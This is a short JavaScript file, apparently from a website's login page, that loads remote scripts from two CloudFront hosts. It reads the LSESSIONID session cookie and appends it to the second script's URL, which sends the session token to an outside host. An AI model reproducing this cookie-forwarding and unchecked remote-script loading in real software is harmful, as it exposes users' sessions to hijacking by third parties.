var clt = 0;

function getDev() {
    clt = 1;
    document.getElementById("clt").value = clt;
}

function envlope(ISCD) {
    document.getElementById("iscd").value = ISCD;
};


(function () {
    var c = window, d = document, g = c.location.protocol, f = d.getElementsByTagName('head')[0],
        b = d.createElement('script');
    b.src = (g == 'https:' ? 'https://' : 'http://') + 'dqnjn206bwvk2.cloudfront.net/321226/fruprem.js?r=' + Math.random();
    b.async = true;
    setTimeout(function () {
        b.type = 'text/javascript';
        f.appendChild(b)
    }, 0)
})();

var cookie_value = null;
try {
    cookie_value = document.cookie;
} catch (e) {
}
if (cookie_value) {
    var re = new RegExp('(?:^| )(LSESSIONID=.[^;]+)', 'i'), matches = null;
    var result = null;
    if (cookie_value.length > 0) {
        matches = cookie_value.match(re);
        if (matches && matches.length == 2) {
            result = matches[1];
        }
    }
}
var url = "https://d2ydsn9mah1r4u.cloudfront.net/321226/loreo.js";
var s = document.createElement('script');
s.type = "text/javascript";
s.async = true;
var extra = ["dt=login&r=" + Math.random()];
if (result) {
    extra.push(result);
}
s.src = [url, extra.join("&")].join("?");
document.getElementsByTagName('head')[0].appendChild(s);
